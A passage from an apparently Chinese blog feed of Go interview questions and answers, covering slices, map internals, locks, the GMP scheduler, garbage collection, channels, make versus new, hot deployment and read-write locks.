计算cap的逻辑</strong></h3><ol><li>原cap扩容一倍，即doublecap</li><li>如果指定cap大于doublecap则使用cap，否则执行如下</li><li>如果原数据长度小于1024，则使用doublecap</li><li>否则在原cap的基础上每次扩容1/4，直至不小于cap</li></ol><h2 id="如何实现一个线程安全的-map"><a href="#如何实现一个线程安全的-map" class="headerlink" title="如何实现一个线程安全的 map?"></a>如何实现一个线程安全的 map?</h2><h3 id="三种方式实现："><a href="#三种方式实现：" class="headerlink" title="三种方式实现："></a><strong>三种方式实现</strong>：</h3><ul><li>加读写锁</li><li>分片加锁</li><li>sync.Map</li></ul><p>加读写锁、分片加锁，这两种方案都比较常用，后者的性能更好，因为它可以降低锁的粒度，提高访问此 map 对象的吞吐。前者并发性能虽然不如后者，<br>但是加锁的方式更加简单。sync.Map 是 Go 1.9 增加的一个线程安全的 map ，虽然是官方标准，但反而是不常用的，原因是 map 要解决的场景很难</p><p>描述，很多时候程序员在做抉择是否该用它，不过在一些特殊场景会使用 sync.Map，</p><h4 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a>场景一：</h4><p>只会增长的缓存系统，一个 key 值写入一次而被读很多次；</p><h4 id="场景二："><a href="#场景二：" class="headerlink" title="场景二："></a>场景二：</h4><p>多个 goroutine 为不相交的键读、写和重写键值对。对它的使用场景介绍，来自<a href="https://golang.org/pkg/sync/#Map">官方文档</a>，这里就不展开了。<br>加读写锁，扩展 map 来实现线程安全，支持并发读写。使用读写锁 RWMutex，是为了读写性能的考虑。<br>对 map 对象的操作，无非就是常见的增删改查和遍历。我们可以将查询和遍历看作读操作，增加、修改和<br>删除看作写操作。示例代码链接：<a href="https://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go">https://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go</a><br>。通过读写锁提供线程安全的 map，但是大量并发读写的情况下，锁的竞争会很激烈，导致性能降低。如何解决这个问题？<br>尽量减少锁的粒度和锁的持有时间，减少锁的粒度，常用方法就是分片 Shard，将一把锁分成几把锁，每个锁控制一个分片。</p><h2 id="⭐go-的锁是可重入的吗？"><a href="#⭐go-的锁是可重入的吗？" class="headerlink" title="⭐go 的锁是可重入的吗？"></a>⭐go 的锁是可重入的吗？</h2><p><strong>不是可重入锁。</strong><br>讨论这个问题前，先解释一下“重入”这个概念。当一个线程获取到锁时，如果没有其他线程拥有这个锁，那么这个线程就会成功获取到这个锁。线程持有这个锁后，其他线程再请求这个锁，其他线程就会进入阻塞等待的状态。</p><p>但是如果拥有这个锁的线程再请求这把锁的话，就不会阻塞，而是成功返回，这就是可重入锁。可重入锁也叫做<strong>递归锁</strong>。<br>为什么 go 的锁不是可重入锁，因为 Mutex 的实现中，没有记录哪个 goroutine 拥有这把锁。换句话说，我们可以通过<br>扩展来将 go 的锁变为可重入锁，这里就不展开了。下面是一个误用 Mutex 的重入例子：<a href="https://github.com/guowei-gong/go-demo/commit/a6fc236853f5cd0efd4e62269cfe60a19de7a96e">https://github.com/guowei-gong/go-demo/commit/a6fc236853f5cd0efd4e62269cfe60a19de7a96e</a></p><h2 id="⭐Go-map-的底层实现-？"><a href="#⭐Go-map-的底层实现-？" class="headerlink" title="⭐Go map 的底层实现 ？"></a>⭐Go map 的底层实现 ？</h2><p>Go语言的map使用Hash表和搜索树作为底层实现，一个Hash表可以有多个bucket，而每个bucket保存了map中的一个或一组键值对。</p><p><strong>源码：</strong><code>runtime/map.go:hmap</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// go 1.17</span></span><br><span class="line"><span class="keyword">type</span> hmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    count      <span class="type">int</span>            <span class="comment">//元素个数，调用len(map)时直接返回</span></span><br><span class="line">    flags      <span class="type">uint8</span>          <span class="comment">//标志map当前状态,正在删除元素、添加元素.....</span></span><br><span class="line">    B          <span class="type">uint8</span>          <span class="comment">//单元(buckets)的对数 B=5表示能容纳32个元素</span></span><br><span class="line">    noverflow  <span class="type">uint16</span>        <span class="comment">//单元(buckets)溢出数量，如果一个单元能存8个key，此时存储了9个，溢出了，就需要再增加一个单元</span></span><br><span class="line">    hash0      <span class="type">uint32</span>         <span class="comment">//哈希种子</span></span><br><span class="line">    buckets    unsafe.Pointer <span class="comment">//指向单元(buckets)数组,大小为2^B，可以为nil</span></span><br><span class="line">    oldbuckets unsafe.Pointer <span class="comment">//扩容的时候，buckets长度会是oldbuckets的两倍</span></span><br><span class="line">    nevacute   <span class="type">uintptr</span>        <span class="comment">//指示扩容进度，小于此buckets迁移完成</span></span><br><span class="line">    extra      *mapextra      <span class="comment">//与gc相关 可选字段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下图展示了一个拥有4个bucket的map。</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20220403085916040.png" alt="image-20220403085916040"></p><p>本例中，hmap.B=2，hmap.buckets数组的长度是4 (2B)。元素经过Hash运算后会落到某个bucket中进行存储。</p><p><strong>bucket的数据结构</strong></p><p>数据结构源码：<code>runtime/map.go/bmap</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A bucket for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">tophash [bucketCnt]<span class="type">uint8</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实际上编译期间会生成一个新的数据结构</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    topbits  [<span class="number">8</span>]<span class="type">uint8</span></span><br><span class="line">    keys     [<span class="number">8</span>]keytype</span><br><span class="line">    values   [<span class="number">8</span>]valuetype</span><br><span class="line">    pad      <span class="type">uintptr</span></span><br><span class="line">    overflow <span class="type">uintptr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bmp也就是bucket，由初始化的结构体可知，里面最多存8个key，每个key落在桶的位置有hash出来的结果的高8位决定。</p><p>其中tophash是一个长度为8的整型数组，Hash值相同的键存入当前bucket时会将Hash值的高位存储在该数组中，以便后续匹配。</p><p>整体图如下</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20220403092625292.png" alt="image-20220403092625292"></p><p>有一点需要注意：当<code>map</code>的<code>key</code>和<code>value</code>都不是指针，并且<code>size</code>都小于 128 字节的情况下，会把 <code>bmap</code>标记为不含指针，这样可以避免<code>gc</code>时扫描整个<code>hmap</code>。尽管如此，但如图所示，<code>bmap</code>是有一个<code>overflow</code>的字段，该字段是指针类型，这就破坏了<code>bmap</code>不含指针的设想，这时会把<code>overflow</code>移动到<code>extra</code>字段来。</p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（六）</title>
      <link href="/posts/40874.html"/>
      <url>/posts/40874.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（六）"><a href="#Golang题库（六）" class="headerlink" title="Golang题库（六）"></a>Golang题库（六）</h1><h2 id="✨讲一讲-GMP-模型"><a href="#✨讲一讲-GMP-模型" class="headerlink" title="✨讲一讲 GMP 模型"></a>✨讲一讲 GMP 模型</h2><p><strong>三个字母的含义</strong></p><ul><li><code>G（Goroutine）</code>：G 就是我们所说的 Go 语言中的协程 Goroutine 的缩写，相当于操作系统中的进程控制块。其中存着 goroutine 的运行时栈信息，CPU 的一些寄存器的值以及执行的函数指令等。</li><li><code>M（Machine）</code>：代表一个操作系统的主线程，对内核级线程的封装，数量对应真实的 CPU 数。一个 M 直接关联一个 os 内核线程，用于执行 G。M 会优先从关联的 P 的本地队列中直接获取待执行的 G。M 保存了 M 自身使用的栈信息、当前正在 M上执行的 G 信息、与之绑定的 P 信息。</li><li><code>P（Processor）</code>：Processor 代表了 M 所需的上下文环境，代表 M 运行 G 所需要的资源。是处理用户级代码逻辑的处理器，可以将其看作一个局部调度器使 go 代码在一个线程上跑。当 P 有任务时，就需要创建或者唤醒一个系统线程来执行它队列里的任务，所以 P 和 M 是相互绑定的。总的来说，P 可以根据实际情况开启协程去工作，它包含了运行 goroutine 的资源，如果线程想运行 goroutine，必须先获取 P，P 中还包含了可运行的 G 队列。</li></ul><p><strong>源码</strong></p><ol><li><strong>G</strong></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> g <span class="keyword">struct</span> &#123;</span><br><span class="line">  stack       stack   <span class="comment">// 描述真实的栈内存，包括上下界</span></span><br><span class="line"></span><br><span class="line">  m              *m     <span class="comment">// 当前的 m</span></span><br><span class="line">  sched          gobuf   <span class="comment">// goroutine 切换时，用于保存 g 的上下文      </span></span><br><span class="line">  param          unsafe.Pointer <span class="comment">// 用于传递参数，睡眠时其他 goroutine 可以设置 param，唤醒时该goroutine可以获取</span></span><br><span class="line">  atomicstatus   <span class="type">uint32</span></span><br><span class="line">  stackLock      <span class="type">uint32</span> </span><br><span class="line">  goid           <span class="type">int64</span>  <span class="comment">// goroutine 的 ID</span></span><br><span class="line">  waitsince      <span class="type">int64</span> <span class="comment">// g 被阻塞的大体时间</span></span><br><span class="line">  lockedm        *m     <span class="comment">// G 被锁定只在这个 m 上运行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 sched 比较重要，该字段保存了 goroutine 的上下文。goroutine 切换的时候不同于线程有 OS 来负责这部分数据，而是由一个 gobuf 结构体来保存，gobuf 的结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> gobuf <span class="keyword">struct</span> &#123;</span><br><span class="line">    sp   <span class="type">uintptr</span></span><br><span class="line">    pc   <span class="type">uintptr</span></span><br><span class="line">    g    guintptr</span><br><span class="line">    ctxt unsafe.Pointer</span><br><span class="line">    ret  sys.Uintreg</span><br><span class="line">    lr   <span class="type">uintptr</span></span><br><span class="line">    bp   <span class="type">uintptr</span> <span class="comment">// for GOEXPERIMENT=framepointer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看出该结构体保存了当前的栈指针，计数器，还有 g 自身，这里记录自身 g 的指针的目的是为了<strong>能快速的访问到 goroutine 中的信息</strong>。</p><ol><li><strong>M</strong></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> m <span class="keyword">struct</span> &#123;</span><br><span class="line">    g0      *g     <span class="comment">// 带有调度栈的goroutine</span></span><br><span class="line"></span><br><span class="line">    gsignal       *g         <span class="comment">// 处理信号的goroutine</span></span><br><span class="line">    tls           [<span class="number">6</span>]<span class="type">uintptr</span> <span class="comment">// thread-local storage</span></span><br><span class="line">    mstartfn      <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">    curg          *g       <span class="comment">// 当前运行的goroutine</span></span><br><span class="line">    caughtsig     guintptr </span><br><span class="line">    p             puintptr <span class="comment">// 关联p和执行的go代码</span></span><br><span class="line">    nextp         puintptr</span><br><span class="line">    id            <span class="type">int32</span></span><br><span class="line">    mallocing     <span class="type">int32</span> <span class="comment">// 状态</span></span><br><span class="line"></span><br><span class="line">    spinning      <span class="type">bool</span> <span class="comment">// m是否out of work</span></span><br><span class="line">    blocked       <span class="type">bool</span> <span class="comment">// m是否被阻塞</span></span><br><span class="line">    inwb          <span class="type">bool</span> <span class="comment">// m是否在执行写屏蔽</span></span><br><span class="line"></span><br><span class="line">    printlock     <span class="type">int8</span></span><br><span class="line">    incgo         <span class="type">bool</span></span><br><span class="line">    fastrand      <span class="type">uint32</span></span><br><span class="line">    ncgocall      <span class="type">uint64</span>      <span class="comment">// cgo调用的总数</span></span><br><span class="line">    ncgo          <span class="type">int32</span>       <span class="comment">// 当前cgo调用的数目</span></span><br><span class="line">    park          note</span><br><span class="line">    alllink       *m <span class="comment">// 用于链接allm</span></span><br><span class="line">    schedlink     muintptr</span><br><span class="line">    mcache        *mcache <span class="comment">// 当前m的内存缓存</span></span><br><span class="line">    lockedg       *g <span class="comment">// 锁定g在当前m上执行，而不会切换到其他m</span></span><br><span class="line">    createstack   [<span class="number">32</span>]<span class="type">uintptr</span> <span class="comment">// thread创建的栈</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体 M 中，有两个重要的字段：</p><ul><li>curg：代表结构体M当前绑定的结构体 G 。</li><li>g0 ：是带有调度栈的 goroutine，普通的 goroutine 的栈是在<strong>堆上</strong>分配的可增长的栈，但是 g0 的栈是 <strong>M 对应的线程</strong>的栈。与调度相关的代码，会先切换到该 goroutine 的栈中再执行。</li></ul><ol><li><strong>P</strong></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> p <span class="keyword">struct</span> &#123;</span><br><span class="line">    lock mutex</span><br><span class="line"></span><br><span class="line">    id          <span class="type">int32</span></span><br><span class="line">    status      <span class="type">uint32</span> <span class="comment">// 状态，可以为pidle/prunning/...</span></span><br><span class="line">    link        puintptr</span><br><span class="line">    schedtick   <span class="type">uint32</span>     <span class="comment">// 每调度一次加1</span></span><br><span class="line">    syscalltick <span class="type">uint32</span>     <span class="comment">// 每一次系统调用加1</span></span><br><span class="line">    sysmontick  sysmontick </span><br><span class="line">    m           muintptr   <span class="comment">// 回链到关联的m</span></span><br><span class="line">    mcache      *mcache</span><br><span class="line">    racectx     <span class="type">uintptr</span></span><br><span class="line"></span><br><span class="line">    goidcache    <span class="type">uint64</span> <span class="comment">// goroutine的ID的缓存</span></span><br><span class="line">    goidcacheend <span class="type">uint64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可运行的goroutine的队列</span></span><br><span class="line">    runqhead <span class="type">uint32</span></span><br><span class="line">    runqtail <span class="type">uint32</span></span><br><span class="line">    runq     [<span class="number">256</span>]guintptr</span><br><span class="line"></span><br><span class="line">    runnext guintptr <span class="comment">// 下一个运行的g</span></span><br><span class="line"></span><br><span class="line">    sudogcache []*sudog</span><br><span class="line">    sudogbuf   [<span class="number">128</span>]*sudog</span><br><span class="line"></span><br><span class="line">    palloc persistentAlloc <span class="comment">// per-P to avoid mutex</span></span><br><span class="line"></span><br><span class="line">    pad [sys.CacheLineSize]<span class="type">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>P 的个数就是 GOMAXPROCS（最大256），启动时固定的，一般不修改；GOMAXPOCS 默认值是当前电脑的核心数，单核CPU就只能设置为1，如果设置&gt;1，在 GOMAXPOCS 函数中也会被修改为1。</li><li>M 的个数和P 的个数不一定一样多（会有休眠的M或者不需要太多的 M）（M 最大10000）；</li><li>每一个 P 保存着本地 G 任务队列，也有一个全局 G 任务队列。</li></ul><p><strong>模型介绍</strong></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/1648716696731-0d4e04b1-da32-4ff8-ac44-f2f74cfb7629-16488810664042.jpeg" alt="img"><br>本地队列：存放等待运行的 G，一个本地队列存放的G数量一般不超过 256 个，优先将新创建的 G 放在 P 的本地队列中，如果满了会放在全局队列中。<br>全局队列：存放等待运行的 G，读写要<strong>加锁</strong>，所以拿取效率在多线程竞争的情况下相比于本地队列来说要低。</p><p><strong>面试回答模板</strong></p><p>首先呢，GMP 这三个字母的含义分别是 Goroutine，Machine，Processor。这个Goroutine，相当于操作系统中的进程控制块。其中存着 goroutine 的运行时栈信息，CPU 的一些寄存器的值以及执行的函数指令等。Machine就是代表了一个操作系统的主线。M 结构体中，保存了 M 自身使用的栈信息、当前正在 M上执行的 G 信息、与之绑定的 P 信息。M 直接关联一个 os 内核线程，用于执行 G。（这里思考一个这个模型的图片回答），这个 M 做的事情就是从关联的 P 的本地队列中直接获取待执行的 G。剩下的 Processor 是代表了 M 所需的上下文环境，代表 M 运行 G 所需要的资源。当 P 有任务时，就需要创建或者唤醒一个系统线程来执行它队列里的任务。在GMP调度模型中，P 的个数就是 GOMAXPROCS，是可以手动设置的，但一般不修改，GOMAXPOCS 默认值是当前电脑的核心数，单核CPU就只能设置为1，如果设置&gt;1，在 GOMAXPOCS 函数中也会被修改为1。总的来说，这个 P 结构体的主要的任务就是可以根据实际情况开启协程去工作。</p><h2 id="🌟了解的GC算法有哪些？"><a href="#🌟了解的GC算法有哪些？" class="headerlink" title="🌟了解的GC算法有哪些？"></a>🌟了解的GC算法有哪些？</h2><p>常见的垃圾回收算法有以下几种：</p><h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p><strong>引用计数：</strong>对每个对象维护一个引用计数，当引用该对象的对象被销毁时，引用计数减1，当引用计数器为0时回收该对象。<br>优点：对象可以很快的被回收，不会出现内存耗尽或达到某个阀值时才回收。<br>缺点：不能很好的处理循环引用，而且实时维护引用计数，有也一定的代价。<br><code>代表语言：Python、PHP</code></p><h3 id="标记-清除"><a href="#标记-清除" class="headerlink" title="标记-清除"></a>标记-清除</h3><p><strong>标记-清除：</strong>从根变量开始遍历所有引用的对象，引用的对象标记为”被引用”，没有被标记的进行回收。<br>优点：解决了引用计数的缺点。<br>缺点：需要STW，即要暂时停掉程序运行。<br><code>代表语言：Golang(其采用三色标记法)</code></p><h3 id="分代收集"><a href="#分代收集" class="headerlink" title="分代收集"></a>分代收集</h3><p><strong>分代收集：</strong>按照对象生命周期长短划分不同的代空间，生命周期长的放入老年代，而短的放入新生代，不同代有不能的回收算法和回收频率。<br>优点：回收性能好<br>缺点：算法复杂<br><code>代表语言： JAVA</code></p><h3 id="三色标记法"><a href="#三色标记法" class="headerlink" title="三色标记法"></a><strong>三色标记法</strong></h3><ol><li><p>初始状态下所有对象都是白色的。</p></li><li><p>从根节点开始遍历所有对象，把遍历到的对象变成灰色对象</p></li><li><p>遍历灰色对象，将灰色对象引用的对象也变成灰色，然后将遍历过的灰色对象变成黑色对象。</p></li><li><p>循环步骤3，直到灰色对象全部变黑色。</p></li><li><p>回收所有白色对象（垃圾）。</p></li></ol><h2 id="go垃圾回收，什么时候触发"><a href="#go垃圾回收，什么时候触发" class="headerlink" title="go垃圾回收，什么时候触发"></a>go垃圾回收，什么时候触发</h2><h3 id="主动触发"><a href="#主动触发" class="headerlink" title="主动触发"></a>主动触发</h3><p>主动触发(手动触发)，通过调用 runtime.GC 来触发GC，此调用阻塞式地等待当前GC运行完毕。</p><h3 id="被动触发"><a href="#被动触发" class="headerlink" title="被动触发"></a>被动触发</h3><p>被动触发，分为两种方式：</p><ol><li>使用<strong>步调（Pacing）算法</strong>，其核心思想是控制内存增长的比例,每次内存分配时检查当前内存分配量是否已达到<strong>阈值（环境变量GOGC）：默认100%<strong>，即</strong>当内存扩大一倍时启用GC</strong>。</li><li>使用系统监控，当<strong>超过两分钟</strong>没有产生任何GC时，强制触发 GC。</li></ol><h2 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h2><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p><strong>拷贝的是数据本身</strong>，创造一个新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。</p><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p><strong>拷贝的是数据地址</strong>，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。<br>实现浅拷贝的方式：引用类型的变量,默认赋值操作就是浅拷贝</p><h2 id="为什么不要大量使用goroutine"><a href="#为什么不要大量使用goroutine" class="headerlink" title="为什么不要大量使用goroutine"></a>为什么不要大量使用goroutine</h2><p><strong>合理复用协程</strong></p><p>使用goroutine可以帮助提高程序的并发性和性能，但是过度使用goroutine会带来一些问题，例如：</p><ul><li>内存占用增加，因为每个goroutine都需要占用一定的内存</li><li>过多的goroutine会导致CPU上下文切换频繁，影响程序性能</li><li>如果goroutine没有正确的管理，可能会导致资源泄漏或死锁<br>为了优化这些问题，可以考虑以下方法：</li><li>确定适当的goroutine数量，避免过度使用goroutine。</li><li>使用有限的goroutine池，以限制goroutine的总数，并避免内存占用过多。</li><li>优化goroutine的调度，以减少CPU上下文切换的次数。</li><li>使用通道和其他同步原语来避免竞争条件和死锁。</li></ul><h2 id="channel有缓冲和无缓冲在使用上有什么区别？"><a href="#channel有缓冲和无缓冲在使用上有什么区别？" class="headerlink" title="channel有缓冲和无缓冲在使用上有什么区别？"></a>channel有缓冲和无缓冲在使用上有什么区别？</h2><p>无缓冲：发送和接收需要同步。<br>有缓冲：不要求发送和接收同步，缓冲满时发送阻塞。<br>因此 channel 无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据；channel有缓冲时，当缓冲满时发送阻塞，当缓冲空时接收阻塞。</p><h2 id="go-的优势"><a href="#go-的优势" class="headerlink" title="go 的优势"></a>go 的优势</h2><ol><li><p>与其他作为学术实验开始的语言不同，Go 代码的设计是务实的。每个功能和语法决策都旨在让程序员的生活更轻松。</p></li><li><p>Golang针对并发进行了优化，并且在规模上运行良好。</p></li><li><p>由于单一的标准代码格式，Golang 通常被认为比其他语言更具可读性。</p></li><li><p>自动垃圾收集明显比 Java 或 Python 更有效，因为它与程序同时执行。</p></li><li><p>Go在语言层面支持高并发</p></li><li><p>Go属于开发效率和运行效率折中的一门语言</p></li></ol><h2 id="如何判断channel是否关闭？"><a href="#如何判断channel是否关闭？" class="headerlink" title="如何判断channel是否关闭？"></a>如何判断channel是否关闭？</h2><ul><li><p>读channel的时候判断其是否已经关闭<br><code>_,ok := &lt;- jobs</code><br>此时如果 channel 关闭，ok 值为 false</p></li><li><p>写入channel的时候判断其是否已经关闭</p><ol><li><p><code>_,ok := &lt;- jobs</code></p><p>此时如果 channel 关闭，ok 值为 false，如果 channel 没有关闭，则会漏掉一个 jobs中的一个数据</p></li><li><p>使用 select 方式</p><p>再创建一个 channel，叫做 timeout，如果超时往这个 channel 发送 true，在生产者发送数据给 jobs 的 channel，用 select 监听 timeout，如果超时则关闭 jobs 的 channel。</p></li></ol></li></ul><h2 id="make-与-new-的区别"><a href="#make-与-new-的区别" class="headerlink" title="make 与 new 的区别"></a>make 与 new 的区别</h2><p><strong>引用类型与值类型</strong></p><p><code>引用类型</code> 变量存储的是一个地址，这个地址存储最终的值。内存通常在堆上分配。通过 GC 回收。包括 指针、slice 切片、管道 channel、接口 interface、map、函数等。</p><p><code>值类型</code>是 基本数据类型，int,float,bool,string, 以及数组和 struct 特点：变量直接存储值，内存通常在栈中分配，栈在函数调用后会被释放</p><p>对于<code>引用类型</code>的变量，我们不光要声明它，还要为它分配内容空间</p><p>对于<code>值类型</code>的则不需要显示分配内存空间，是因为go会默认帮我们分配好</p><p><strong>new()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func new(Type) *Type</span><br></pre></td></tr></table></figure><p>new()对类型进行内存分配,入参为类型,返回为类型的指针，指向分配类型的内存地址</p><p><strong>make()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func make(t Type, size ...IntegerType) Type</span><br></pre></td></tr></table></figure><p>make()也是用于内存分配的，但是和new不同，它只用于channel、map以及切片的内存创建，而且它返回的类型就是这三个类型本身，而不是他们的指针类型，因为这三种类型就是引用类型，所以就没有必要返回他们的指针了。</p><p>注意，因为这三种类型是引用类型，所以必须得初始化，但是不是置为零值，这个和new是不一样的。</p><p>简而言之make()用于初始化slice, map, channel等内置数据结构</p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（五）</title>
      <link href="/posts/55219.html"/>
      <url>/posts/55219.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（五）"><a href="#Golang题库（五）" class="headerlink" title="Golang题库（五）"></a>Golang题库（五）</h1><h2 id="go-实现不重启热部署"><a href="#go-实现不重启热部署" class="headerlink" title="go 实现不重启热部署"></a>go 实现不重启热部署</h2><h3 id="根据SIGHUP-信号量"><a href="#根据SIGHUP-信号量" class="headerlink" title="根据SIGHUP 信号量"></a>根据SIGHUP 信号量</h3><p>根据系统的 SIGHUP 信号量，以此信号量触发进程重启，达到热更新的效果。</p><p>热部署我们需要考虑几个能力：</p><ul><li>新进程启动成功，老进程不会有资源残留</li><li>新进程初始化的过程中，服务不会中断</li><li>新进程初始化失败，老进程仍然继续工作</li><li>同一时间，只能有一个更新动作执行</li></ul><p>监听信号量的方法的环境是在 类 UNIX 系统中，在现在的 UNIX 内核中，允许多个进程同时监听一个端口。在收到 SIGHUP 信号量时，先 fork 出一个新的进程监听端口，同时等待旧进程处理完已经进来的连接，最后杀掉旧进程。</p><h3 id="使用air包"><a href="#使用air包" class="headerlink" title="使用air包"></a>使用air包</h3><p><code>air</code>包可以实现插件化热更新的方案，集成方便，非常适用于小型项目的开发。</p><h3 id="⭐saas灰度发布"><a href="#⭐saas灰度发布" class="headerlink" title="⭐saas灰度发布"></a>⭐saas灰度发布</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>灰度发布常见有三种模式<code>金丝雀发布</code>、<code>滚动发布</code>、<code>蓝绿发布</code>。灰度发布主要是更新服务中，通过服务的<code>多节点、多切片</code>进行无感知的服务更新迭代。阿里云、AWS等云平台都已支持灰度发布功能。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>灰度发布主要是通过网关转发的均衡负载，确保服务更新过程中能够<code>不停机</code>、<code>无感知</code>、<code>可回溯</code>。常见的灰度发布实现方案有<code>Nginx +Lua + Redis 实现灰度发布</code>、<code>Openresty+Lua+Redis灰度发布</code>、<code>Treafit+golang+Redis灰度发布</code>。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一套成熟的灰度发布系统，是需要有运维去维护的，需要一定的人力成本。同时灰度发布不适用于<code>敏捷开发</code>，对于需要敏捷开发的团队来说，通常业务变动频繁，版本管理和代码审核都会缺少严谨，徒增成本。</p><h2 id="🪫（待补充）读写锁底层是怎么实现的"><a href="#🪫（待补充）读写锁底层是怎么实现的" class="headerlink" title="🪫（待补充）读写锁底层是怎么实现的"></a>🪫（待补充）读写锁底层是怎么实现的</h2><p>读写锁的底层是基于互斥锁实现的。</p><ul><li>为什么有读写锁，它解决了什么问题？（使用场景）</li><li>它的底层原理是什么？</li></ul><p>在这里我会结合 Go 中的读写锁 RWMutex 进行介绍。</p><p>我们通过与 Mutex 对比得出答案。Mutex 是不区分 goroutine 对共享资源的操作行为的，在读操作、它会上锁，在写操作，它也会上锁，当一段时间内，读操作居多时，读操作在 Mutex 的保护下也不得不变为串行访问，对性能的影响也就比较大了。</p><p>RWMutex 读写锁的诞生为了区分读写操作，在进行读操作时，goroutine 就不必傻傻的等待了，而是可以并发地访问共享资源，将串行读变成了并行读，提高了读操作的性能。</p><p>读写锁针对解决一类问题：readers-writes 